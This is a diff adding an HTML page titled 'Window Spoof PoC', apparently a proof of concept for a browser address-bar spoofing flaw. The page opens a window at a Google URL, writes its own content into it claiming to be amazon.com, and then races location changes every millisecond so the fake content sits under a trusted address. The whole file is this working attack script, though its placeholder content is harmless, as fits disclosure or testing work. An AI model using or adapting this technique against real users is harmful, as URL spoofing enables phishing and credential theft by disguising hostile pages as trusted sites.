@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Window Spoof PoC</title>
+</head>
+
+<body>
+  <button id="spoofBtn">Launch Spoof</button>
+
+  <script>
+    let spoofWin = null;
+    let raceTimer = null;
+
+    function locationRace() {
+      try {
+        if (spoofWin && spoofWin.location.href !== 'about:blank') {
+          // noop
+        }
+      } catch (err) {
+        try {
+          spoofWin.location.replace('https://www.google.com/csi');
+        } catch (_) {}
+      }
+    }
+
+    function launchSpoof() {
+      spoofWin = window.open(
+        'https://www.google.com:82',
+        'spoof_tab',
+        'noopener=false'
+      );
+
+      if (!spoofWin) return;
+
+      spoofWin.document.open();
+      spoofWin.document.write(`
+        <style>
+          body {
+            font-family: Arial, sans-serif;
+            background: #fff;
+            padding: 20px;
+          }
+        </style>
+        <h2>Test Page</h2>
+        <p>This page is pretending to be <b>https://www.amazon.com</b></p>
+      `);
+      spoofWin.document.close();
+
+      raceTimer = setInterval(locationRace, 1);
+    }
+
+    document
+      .getElementById('spoofBtn')
+      .addEventListener('click', launchSpoof);
+  </script>
+</body>
+</html>
